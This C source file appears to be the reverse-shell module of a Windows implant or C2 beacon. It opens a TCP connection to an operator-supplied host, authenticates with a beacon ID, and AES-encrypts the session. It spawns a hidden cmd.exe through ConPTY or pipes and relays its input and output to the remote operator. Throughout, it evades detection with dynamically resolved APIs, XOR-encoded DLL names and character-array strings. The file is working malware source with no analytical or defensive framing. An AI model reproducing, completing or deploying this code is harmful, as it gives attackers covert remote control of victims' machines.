#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "shell.h"
#include "protocol.h"
#include "crypto.h"
#include "dynapi.h"
#include "obf.h"
#include "obf_strings.h"

#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
#endif

#ifndef CREATE_NO_WINDOW
#define CREATE_NO_WINDOW 0x08000000
#endif

/* ------------------------------------------------------------------ */
/*  Shell mode enum and global state                                   */
/* ------------------------------------------------------------------ */
enum shell_mode { SHELL_NONE = 0, SHELL_CONPTY = 1, SHELL_PIPE = 2 };

static CRITICAL_SECTION  g_shell_cs;
static volatile LONG     g_cs_initialized = 0;
static volatile LONG     g_shell_mode     = SHELL_NONE;
static volatile LONG     g_shell_active   = 0;
static HPCON             g_hPC            = NULL;
static HANDLE            g_pipe_in_write  = NULL;
static HANDLE            g_pipe_out_read  = NULL;
static HANDLE            g_process        = NULL;
static HANDLE            g_reader_thread  = NULL;
static HANDLE            g_setup_done     = NULL;
static volatile LONG     g_setup_result   = -1;

/* ------------------------------------------------------------------ */
/*  Shell TCP globals and helpers                                      */
/* ------------------------------------------------------------------ */
static SOCKET            g_shell_sock     = INVALID_SOCKET;
static CRITICAL_SECTION  g_shell_write_cs;
static volatile LONG     g_write_cs_initialized = 0;
static HANDLE            g_input_thread   = NULL;

/* Session key + beacon id stored for input thread decryption */
static uint8_t          *g_shell_key      = NULL;
static uint32_t          g_shell_beacon_id = 0;

typedef struct {
    uint8_t *key;
    uint32_t label;
} shell_ctx_t;

static void ensure_cs_init(void) {
    if (InterlockedCompareExchange(&g_cs_initialized, 1, 0) == 0) {
        fnInitializeCriticalSection(&g_shell_cs);
    }
}

static void ensure_write_cs_init(void) {
    if (InterlockedCompareExchange(&g_write_cs_initialized, 1, 0) == 0) {
        fnInitializeCriticalSection(&g_shell_write_cs);
    }
}

/* ------------------------------------------------------------------ */
/*  TCP helpers: send_all / recv_all for shell socket                   */
/* ------------------------------------------------------------------ */
static int shell_send_all(SOCKET sock, const uint8_t *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = fnSend(sock, (const char *)(buf + sent), len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int shell_recv_all(SOCKET sock, uint8_t *buf, int len) {
    int got = 0;
    while (got < len) {
        int n = fnRecv(sock, (char *)(buf + got), len - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/*  shell_safe_write -- thread-safe envelope write to g_shell_sock     */
/*  Sends 4-byte LE length prefix + data                               */
/* ------------------------------------------------------------------ */
static int shell_safe_write(const uint8_t *data, int len) {
    if (g_shell_sock == INVALID_SOCKET) return -1;
    ensure_write_cs_init();
    fnEnterCriticalSection(&g_shell_write_cs);

    uint8_t hdr[4];
    hdr[0] = (uint8_t)(len);
    hdr[1] = (uint8_t)(len >> 8);
    hdr[2] = (uint8_t)(len >> 16);
    hdr[3] = (uint8_t)(len >> 24);
    int rc = shell_send_all(g_shell_sock, hdr, 4);
    if (rc == 0)
        rc = shell_send_all(g_shell_sock, data, len);

    fnLeaveCriticalSection(&g_shell_write_cs);
    return rc;
}

/* ------------------------------------------------------------------ */
/*  shell_tcp_connect -- open TCP, handshake, return SOCKET            */
/* ------------------------------------------------------------------ */
static SOCKET shell_tcp_connect(const char *host, uint16_t port,
                                uint8_t *session_key, uint32_t beacon_id)
{
    if (!fnSocket || !fnConnect || !fnSend || !fnInet_addr || !fnHtons)
        return INVALID_SOCKET;

    SOCKET s = fnSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = fnHtons(port);
    addr.sin_addr.s_addr = fnInet_addr(host);

    if (fnConnect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fnClosesocket(s);
        return INVALID_SOCKET;
    }

    /* 5-byte handshake: 4-byte beacon ID (LE) + 1 byte CONN_SHELL */
    uint8_t handshake[5];
    handshake[0] = (uint8_t)(beacon_id);
    handshake[1] = (uint8_t)(beacon_id >> 8);
    handshake[2] = (uint8_t)(beacon_id >> 16);
    handshake[3] = (uint8_t)(beacon_id >> 24);
    handshake[4] = CONN_SHELL;

    if (shell_send_all(s, handshake, 5) != 0) {
        fnClosesocket(s);
        return INVALID_SOCKET;
    }

    /* Encrypted confirmation: beacon_id encrypted with AES */
    uint8_t id_buf[4];
    id_buf[0] = (uint8_t)(beacon_id);
    id_buf[1] = (uint8_t)(beacon_id >> 8);
    id_buf[2] = (uint8_t)(beacon_id >> 16);
    id_buf[3] = (uint8_t)(beacon_id >> 24);

    uint8_t enc_buf[128];
    DWORD enc_len = (DWORD)sizeof(enc_buf);
    if (aes_encrypt(session_key, id_buf, 4, enc_buf, &enc_len) != 0) {
        fnClosesocket(s);
        return INVALID_SOCKET;
    }

    /* Send as envelope: 4-byte length prefix + ciphertext */
    uint8_t len_hdr[4];
    len_hdr[0] = (uint8_t)(enc_len);
    len_hdr[1] = (uint8_t)(enc_len >> 8);
    len_hdr[2] = (uint8_t)(enc_len >> 16);
    len_hdr[3] = (uint8_t)(enc_len >> 24);
    if (shell_send_all(s, len_hdr, 4) != 0 ||
        shell_send_all(s, enc_buf, (int)enc_len) != 0) {
        fnClosesocket(s);
        return INVALID_SOCKET;
    }

    return s;
}

/* ------------------------------------------------------------------ */
/*  send_shell_output -- builds TASK_SHELL_OUTPUT packet & sends       */
/*  Now uses g_shell_sock via shell_safe_write                         */
/* ------------------------------------------------------------------ */
static void send_shell_output(uint8_t *key,
                              const char *data, int data_len)
{
    int body_len = 4 + data_len;
    int pkt_len  = 16 + body_len;

    uint8_t *pkt = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len);
    if (!pkt) return;

    task_header_t hdr = {0};
    hdr.type   = TASK_SHELL_OUTPUT;
    hdr.code   = 0;
    hdr.flags  = FLAG_NONE;
    hdr.label  = 0;
    hdr.length = (uint32_t)body_len;
    encode_header(&hdr, pkt);

    /* body: uint32 LE length + data  (run_rep format) */
    pkt[16] = (uint8_t)(data_len);
    pkt[17] = (uint8_t)(data_len >> 8);
    pkt[18] = (uint8_t)(data_len >> 16);
    pkt[19] = (uint8_t)(data_len >> 24);
    memcpy(pkt + 20, data, (size_t)data_len);

    uint8_t *enc = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len + 64);
    if (enc) {
        DWORD enc_len = (DWORD)pkt_len + 64;
        if (aes_encrypt(key, pkt, (DWORD)pkt_len, enc, &enc_len) == 0) {
            shell_safe_write(enc, (int)enc_len);
        }
        fnLocalFree(enc);
    }
    fnLocalFree(pkt);
}

/* ------------------------------------------------------------------ */
/*  shell_stop_internal -- cleanup process, pipes, TCP socket          */
/* ------------------------------------------------------------------ */
static void shell_stop_internal(void) {
    if (InterlockedCompareExchange(&g_shell_active, 1, 1) != 1)
        return;

    ensure_cs_init();

    fnEnterCriticalSection(&g_shell_cs);

    InterlockedExchange(&g_shell_active, 0);

    if (g_process) {
        fnTerminateProcess(g_process, 0);
        fnCloseHandle2(g_process);
        g_process = NULL;
    }
    if (g_hPC) {
        fnClosePseudoConsole(g_hPC);
        g_hPC = NULL;
    }
    if (g_pipe_in_write) {
        fnCloseHandle2(g_pipe_in_write);
        g_pipe_in_write = NULL;
    }
    if (g_pipe_out_read) {
        fnCloseHandle2(g_pipe_out_read);
        g_pipe_out_read = NULL;
    }

    InterlockedExchange(&g_shell_mode, SHELL_NONE);

    fnLeaveCriticalSection(&g_shell_cs);

    if (g_reader_thread) {
        fnWaitForSingleObject(g_reader_thread, 2000);
        fnCloseHandle2(g_reader_thread);
        g_reader_thread = NULL;
    }

    /* Close shell TCP socket */
    if (g_shell_sock != INVALID_SOCKET) {
        fnClosesocket(g_shell_sock);
        g_shell_sock = INVALID_SOCKET;
    }
}

/* ------------------------------------------------------------------ */
/*  Dual-mode reader thread (ConPTY or pipe fallback)                  */
/* ------------------------------------------------------------------ */
static DWORD WINAPI shell_reader_thread(LPVOID param)
{
    shell_ctx_t *ctx = (shell_ctx_t *)param;
    char buf[4096];
    LONG mode = InterlockedCompareExchange(&g_shell_mode, 0, 0);

    if (mode == SHELL_CONPTY) {
        while (InterlockedCompareExchange(&g_shell_active, 1, 1) == 1) {
            DWORD n = 0;
            if (!fnReadFile(g_pipe_out_read, buf, sizeof(buf), &n, NULL) || n == 0)
                break;
            send_shell_output(ctx->key, buf, (int)n);
        }
    } else {
        while (InterlockedCompareExchange(&g_shell_active, 1, 1) == 1) {
            DWORD avail = 0;
            if (!fnPeekNamedPipe(g_pipe_out_read, NULL, 0, NULL, &avail, NULL))
                break;
            if (avail > 0) {
                DWORD n = 0;
                DWORD to_read = avail < sizeof(buf) ? avail : sizeof(buf);
                if (!fnReadFile(g_pipe_out_read, buf, to_read, &n, NULL) || n == 0)
                    break;
                send_shell_output(ctx->key, buf, (int)n);
            } else {
                fnSleep(50);
            }
        }
    }

    fnEnterCriticalSection(&g_shell_cs);

    InterlockedExchange(&g_shell_active, 0);
    InterlockedExchange(&g_shell_mode, SHELL_NONE);

    if (g_process)       { fnCloseHandle2(g_process);       g_process       = NULL; }
    if (g_pipe_in_write) { fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL; }
    if (g_pipe_out_read) { fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL; }
    if (g_hPC)           { fnClosePseudoConsole(g_hPC);     g_hPC           = NULL; }

    fnLeaveCriticalSection(&g_shell_cs);

    const char exit_msg[] = {'\r','\n','[','s','h','e','l','l',' ',
                             'e','x','i','t','e','d',']','\r','\n','\0'};
    send_shell_output(ctx->key, exit_msg, (int)strlen(exit_msg));

    fnLocalFree(ctx);
    return 0;
}

/* ------------------------------------------------------------------ */
/*  shell_input_thread -- reads encrypted envelopes from g_shell_sock  */
/*  Decrypts and dispatches TASK_SHELL_INPUT / TASK_SHELL_STOP         */
/* ------------------------------------------------------------------ */
static DWORD WINAPI shell_input_thread(LPVOID param)
{
    shell_ctx_t *ctx = (shell_ctx_t *)param;

    while (InterlockedCompareExchange(&g_shell_active, 1, 1) == 1) {
        /* Read 4-byte length prefix */
        uint8_t len_buf[4];
        if (shell_recv_all(g_shell_sock, len_buf, 4) != 0)
            break;

        int env_len = (int)len_buf[0] | ((int)len_buf[1] << 8)
                    | ((int)len_buf[2] << 16) | ((int)len_buf[3] << 24);
        if (env_len <= 0 || env_len > (10 * 1024 * 1024))
            break;

        uint8_t *enc_data = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)env_len);
        if (!enc_data) break;

        if (shell_recv_all(g_shell_sock, enc_data, env_len) != 0) {
            fnLocalFree(enc_data);
            break;
        }

        /* Decrypt */
        uint8_t *plain = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)env_len + 64);
        DWORD plain_len = (DWORD)env_len + 64;
        if (!plain) {
            fnLocalFree(enc_data);
            break;
        }

        if (aes_decrypt(ctx->key, enc_data, (DWORD)env_len,
                        plain, &plain_len) != 0 || plain_len < 16) {
            fnLocalFree(plain);
            fnLocalFree(enc_data);
            break;
        }
        fnLocalFree(enc_data);

        /* Decode header */
        task_header_t hdr;
        decode_header(plain, &hdr);
        uint32_t task_data_len = hdr.length;
        const uint8_t *task_data = (16 + task_data_len <= plain_len)
                                    ? plain + 16 : NULL;

        if (hdr.type == TASK_SHELL_INPUT && task_data && task_data_len >= 4) {
            uint32_t input_len = (uint32_t)task_data[0]
                               | ((uint32_t)task_data[1] << 8)
                               | ((uint32_t)task_data[2] << 16)
                               | ((uint32_t)task_data[3] << 24);
            if (input_len <= task_data_len - 4) {
                shell_write_stdin(task_data + 4, (int)input_len);
            }
        }
        else if (hdr.type == TASK_SHELL_STOP) {
            fnLocalFree(plain);
            break;
        }

        fnLocalFree(plain);
    }

    /* Shell input loop ended -- clean up */
    shell_stop_internal();
    fnLocalFree(ctx);
    return 0;
}

/* ------------------------------------------------------------------ */
/*  try_conpty -- attempt ConPTY-based shell spawn                     */
/* ------------------------------------------------------------------ */
static int try_conpty(void)
{
    /* GetProcAddress fallback for APIs that DJB2 hash can't resolve
       through deep API-set forwarding chains on Windows 11 */
    if (fnGetProcAddress && fnGetModuleHandleA) {
        char k32[ENC_DLL_KERNEL32_A_LEN + 1]; xor_dec(k32, ENC_DLL_KERNEL32_A, ENC_DLL_KERNEL32_A_LEN);
        HMODULE hK = fnGetModuleHandleA(k32);
        if (hK) {
            if (!fnCreatePseudoConsole) {
                char n[] = {'C','r','e','a','t','e','P','s','e','u','d','o','C','o','n','s','o','l','e','\0'};
                fnCreatePseudoConsole = (PFN_CreatePseudoConsole)fnGetProcAddress(hK, n);
            }
            if (!fnClosePseudoConsole) {
                char n[] = {'C','l','o','s','e','P','s','e','u','d','o','C','o','n','s','o','l','e','\0'};
                fnClosePseudoConsole = (PFN_ClosePseudoConsole)fnGetProcAddress(hK, n);
            }
            if (!fnInitializeProcThreadAttributeList) {
                char n[] = {'I','n','i','t','i','a','l','i','z','e','P','r','o','c','T','h','r','e','a','d','A','t','t','r','i','b','u','t','e','L','i','s','t','\0'};
                fnInitializeProcThreadAttributeList = (PFN_InitializeProcThreadAttributeList)fnGetProcAddress(hK, n);
            }
            if (!fnUpdateProcThreadAttribute) {
                char n[] = {'U','p','d','a','t','e','P','r','o','c','T','h','r','e','a','d','A','t','t','r','i','b','u','t','e','\0'};
                fnUpdateProcThreadAttribute = (PFN_UpdateProcThreadAttribute)fnGetProcAddress(hK, n);
            }
            if (!fnDeleteProcThreadAttributeList) {
                char n[] = {'D','e','l','e','t','e','P','r','o','c','T','h','r','e','a','d','A','t','t','r','i','b','u','t','e','L','i','s','t','\0'};
                fnDeleteProcThreadAttributeList = (PFN_DeleteProcThreadAttributeList)fnGetProcAddress(hK, n);
            }
            if (!fnHeapAlloc) {
                char n[] = {'H','e','a','p','A','l','l','o','c','\0'};
                fnHeapAlloc = (PFN_HeapAlloc)fnGetProcAddress(hK, n);
            }
            if (!fnGetProcessHeap) {
                char n[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
                fnGetProcessHeap = (PFN_GetProcessHeap)fnGetProcAddress(hK, n);
            }
            if (!fnHeapFree) {
                char n[] = {'H','e','a','p','F','r','e','e','\0'};
                fnHeapFree = (PFN_HeapFree)fnGetProcAddress(hK, n);
            }
        }
    }

    if (!fnCreatePseudoConsole || !fnClosePseudoConsole ||
        !fnInitializeProcThreadAttributeList || !fnUpdateProcThreadAttribute ||
        !fnDeleteProcThreadAttributeList || !fnHeapAlloc ||
        !fnGetProcessHeap || !fnHeapFree)
        return -1;

    HANDLE pipeInRead = NULL, pipeOutWrite = NULL;
    SECURITY_ATTRIBUTES sa;
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    if (!fnCreatePipe(&pipeInRead, &g_pipe_in_write, &sa, 0))
        return -1;
    if (!fnCreatePipe(&g_pipe_out_read, &pipeOutWrite, &sa, 0)) {
        fnCloseHandle2(pipeInRead);
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        return -1;
    }

    COORD sz;
    sz.X = 120; sz.Y = 30;
    HRESULT hr = fnCreatePseudoConsole(sz, pipeInRead, pipeOutWrite, 0, &g_hPC);
    fnCloseHandle2(pipeInRead);
    fnCloseHandle2(pipeOutWrite);

    if (FAILED(hr)) {
        fnCloseHandle2(g_pipe_in_write);  g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read);  g_pipe_out_read = NULL;
        return -1;
    }

    SIZE_T attrSize = 0;
    fnInitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    HANDLE heap = fnGetProcessHeap();
    if (!heap) {
        fnClosePseudoConsole(g_hPC); g_hPC = NULL;
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        return -1;
    }

    LPPROC_THREAD_ATTRIBUTE_LIST al =
        (LPPROC_THREAD_ATTRIBUTE_LIST)fnHeapAlloc(heap, 0, attrSize);
    if (!al) {
        fnClosePseudoConsole(g_hPC); g_hPC = NULL;
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        return -1;
    }

    if (!fnInitializeProcThreadAttributeList(al, 1, 0, &attrSize) ||
        !fnUpdateProcThreadAttribute(al, 0,
            PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, g_hPC, sizeof(HPCON), NULL, NULL)) {
        fnDeleteProcThreadAttributeList(al);
        fnHeapFree(heap, 0, al);
        fnClosePseudoConsole(g_hPC); g_hPC = NULL;
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        return -1;
    }

    STARTUPINFOEXW siEx;
    memset(&siEx, 0, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    siEx.lpAttributeList = al;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    wchar_t cmd[] = { L'c', L'm', L'd', L'.', L'e', L'x', L'e', L'\0' };

    BOOL ok = fnCreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                               EXTENDED_STARTUPINFO_PRESENT,
                               NULL, NULL, &siEx.StartupInfo, &pi);

    fnDeleteProcThreadAttributeList(al);
    fnHeapFree(heap, 0, al);

    if (!ok) {
        fnClosePseudoConsole(g_hPC); g_hPC = NULL;
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        return -1;
    }

    g_process = pi.hProcess;
    fnCloseHandle2(pi.hThread);
    InterlockedExchange(&g_shell_mode, SHELL_CONPTY);
    return 0;
}

/* ------------------------------------------------------------------ */
/*  try_pipes -- fallback: plain pipe-based shell for older Windows     */
/* ------------------------------------------------------------------ */
static int try_pipes(void)
{
    SECURITY_ATTRIBUTES sa;
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE childStdinRead = NULL, childStdoutWrite = NULL;

    if (!fnCreatePipe(&childStdinRead, &g_pipe_in_write, &sa, 0))
        return -1;
    if (!fnCreatePipe(&g_pipe_out_read, &childStdoutWrite, &sa, 0)) {
        fnCloseHandle2(childStdinRead);
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        return -1;
    }

    fnSetHandleInformation(g_pipe_in_write, 1, 0);
    fnSetHandleInformation(g_pipe_out_read, 1, 0);

    STARTUPINFOW si;
    memset(&si, 0, sizeof(si));
    si.cb         = sizeof(STARTUPINFOW);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = childStdinRead;
    si.hStdOutput = childStdoutWrite;
    si.hStdError  = childStdoutWrite;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    wchar_t cmd[] = { L'c', L'm', L'd', L'.', L'e', L'x', L'e', L'\0' };

    BOOL ok = fnCreateProcessW(NULL, cmd, NULL, NULL, TRUE,
                               CREATE_NO_WINDOW,
                               NULL, NULL, &si, &pi);

    fnCloseHandle2(childStdinRead);
    fnCloseHandle2(childStdoutWrite);

    if (!ok) {
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        return -1;
    }

    g_process = pi.hProcess;
    fnCloseHandle2(pi.hThread);
    InterlockedExchange(&g_shell_mode, SHELL_PIPE);
    return 0;
}

/* ------------------------------------------------------------------ */
/*  shell_setup_thread -- runs ConPTY init on dedicated 1MB stack      */
/* ------------------------------------------------------------------ */
static DWORD WINAPI shell_setup_thread(LPVOID param)
{
    shell_ctx_t *ctx = (shell_ctx_t *)param;
    int rc = -1;

    rc = try_conpty();
    if (rc != 0) {
        rc = try_pipes();
    }

    if (rc != 0) {
        const char msg[] = {'[','s','h','e','l','l',':',' ','f','a','i','l','e','d',
                            ' ','t','o',' ','s','t','a','r','t',' ','c','m','d',
                            '.','e','x','e',']','\r','\n','\0'};
        send_shell_output(ctx->key, msg, (int)strlen(msg));
        InterlockedExchange(&g_setup_result, -1);
        fnSetEvent(g_setup_done);
        fnLocalFree(ctx);
        return 1;
    }

    InterlockedExchange(&g_shell_active, 1);

    if (InterlockedCompareExchange(&g_shell_mode, 0, 0) == SHELL_CONPTY) {
        const char tag[] = {'[','c','o','n','p','t','y',']','\n','\0'};
        send_shell_output(ctx->key, tag, (int)strlen(tag));
    } else {
        const char tag[] = {'[','p','i','p','e','s',']','\n','\0'};
        send_shell_output(ctx->key, tag, (int)strlen(tag));
    }

    shell_ctx_t *rctx = (shell_ctx_t *)fnLocalAlloc(0x40, sizeof(shell_ctx_t));
    if (!rctx) {
        fnTerminateProcess(g_process, 1);
        fnCloseHandle2(g_process); g_process = NULL;
        if (g_hPC) { fnClosePseudoConsole(g_hPC); g_hPC = NULL; }
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        InterlockedExchange(&g_shell_active, 0);
        InterlockedExchange(&g_shell_mode, SHELL_NONE);
        InterlockedExchange(&g_setup_result, -1);
        fnSetEvent(g_setup_done);
        fnLocalFree(ctx);
        return 1;
    }
    rctx->key   = ctx->key;
    rctx->label = ctx->label;

    g_reader_thread = fnCreateThread(NULL, 0, shell_reader_thread, rctx, 0, NULL);
    if (!g_reader_thread) {
        fnTerminateProcess(g_process, 1);
        fnCloseHandle2(g_process); g_process = NULL;
        if (g_hPC) { fnClosePseudoConsole(g_hPC); g_hPC = NULL; }
        fnCloseHandle2(g_pipe_in_write); g_pipe_in_write = NULL;
        fnCloseHandle2(g_pipe_out_read); g_pipe_out_read = NULL;
        InterlockedExchange(&g_shell_active, 0);
        InterlockedExchange(&g_shell_mode, SHELL_NONE);
        InterlockedExchange(&g_setup_result, -1);
        fnSetEvent(g_setup_done);
        fnLocalFree(rctx);
        fnLocalFree(ctx);
        return 1;
    }

    InterlockedExchange(&g_setup_result, 0);
    fnSetEvent(g_setup_done);
    fnLocalFree(ctx);
    return 0;
}

/* ------------------------------------------------------------------ */
/*  shell_start -- open shell TCP + spawn shell via setup thread       */
/* ------------------------------------------------------------------ */
int shell_start(const char *host, uint16_t port,
                uint8_t *session_key, uint32_t beacon_id, uint32_t label)
{
    if (InterlockedCompareExchange(&g_shell_active, 0, 0) == 1)
        return 0;

    ensure_cs_init();

    if (!fnCreateThread || !fnCreatePipe || !fnCreateProcessW ||
        !fnReadFile || !fnWriteFile || !fnCreateEventW || !fnSetEvent) {
        return -1;
    }

    /* Open dedicated shell TCP connection */
    g_shell_sock = shell_tcp_connect(host, port, session_key, beacon_id);
    if (g_shell_sock == INVALID_SOCKET)
        return -1;

    g_shell_key       = session_key;
    g_shell_beacon_id = beacon_id;

    g_setup_done = fnCreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_setup_done) {
        fnClosesocket(g_shell_sock);
        g_shell_sock = INVALID_SOCKET;
        return -1;
    }

    InterlockedExchange(&g_setup_result, -1);

    shell_ctx_t *ctx = (shell_ctx_t *)fnLocalAlloc(0x40, sizeof(shell_ctx_t));
    if (!ctx) {
        fnCloseHandle2(g_setup_done); g_setup_done = NULL;
        fnClosesocket(g_shell_sock); g_shell_sock = INVALID_SOCKET;
        return -1;
    }
    ctx->key   = session_key;
    ctx->label = label;

    HANDLE hSetup = fnCreateThread(NULL, 0x100000,
                                   shell_setup_thread, ctx, 0, NULL);
    if (!hSetup) {
        fnLocalFree(ctx);
        fnCloseHandle2(g_setup_done); g_setup_done = NULL;
        fnClosesocket(g_shell_sock); g_shell_sock = INVALID_SOCKET;
        return -1;
    }

    fnWaitForSingleObject(g_setup_done, 5000);
    fnCloseHandle2(g_setup_done); g_setup_done = NULL;
    fnCloseHandle2(hSetup);

    int result = (int)InterlockedCompareExchange(&g_setup_result, 0, 0);

    if (result == 0) {
        /* Setup succeeded -- start input thread to receive from TCP */
        shell_ctx_t *ictx = (shell_ctx_t *)fnLocalAlloc(0x40, sizeof(shell_ctx_t));
        if (ictx) {
            ictx->key   = session_key;
            ictx->label = label;
            g_input_thread = fnCreateThread(NULL, 0, shell_input_thread, ictx, 0, NULL);
            if (!g_input_thread) {
                fnLocalFree(ictx);
            }
        }
    } else {
        /* Setup failed -- close shell socket */
        fnClosesocket(g_shell_sock);
        g_shell_sock = INVALID_SOCKET;
    }

    return result;
}

/* ------------------------------------------------------------------ */
/*  shell_write_stdin -- pipe input into shell                         */
/* ------------------------------------------------------------------ */
int shell_write_stdin(const uint8_t *input, int len)
{
    if (!g_pipe_in_write || InterlockedCompareExchange(&g_shell_active, 1, 1) != 1)
        return -1;

    DWORD written = 0;
    if (!fnWriteFile(g_pipe_in_write, input, (DWORD)len, &written, NULL))
        return -1;

    return (int)written;
}

/* ------------------------------------------------------------------ */
/*  shell_stop -- public API to tear down shell                        */
/* ------------------------------------------------------------------ */
void shell_stop(void)
{
    shell_stop_internal();

    /* Wait for input thread to exit */
    if (g_input_thread) {
        fnWaitForSingleObject(g_input_thread, 2000);
        fnCloseHandle2(g_input_thread);
        g_input_thread = NULL;
    }
}

/* ------------------------------------------------------------------ */
/*  shell_is_active -- check whether shell session is running          */
/* ------------------------------------------------------------------ */
int shell_is_active(void)
{
    return (InterlockedCompareExchange(&g_shell_active, 0, 0) == 1) ? 1 : 0;
}
